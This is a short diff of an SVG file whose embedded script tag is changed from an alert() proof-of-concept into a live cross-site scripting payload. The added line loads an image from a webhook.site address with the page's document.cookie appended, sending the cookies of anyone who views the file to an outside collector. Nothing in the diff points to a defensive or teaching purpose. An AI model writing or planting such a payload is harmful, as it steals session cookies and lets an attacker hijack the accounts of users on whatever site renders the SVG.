@@ -1,5 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script><![CDATA[
-    alert(document.domain + " | " + document.cookie);
+    new Image().src = 'https://webhook.site/dc178026-0966-4143-8ebd-d4ec82a2bd6f?cookie=' + encodeURIComponent(document.cookie);
   ]]></script>
 </svg>
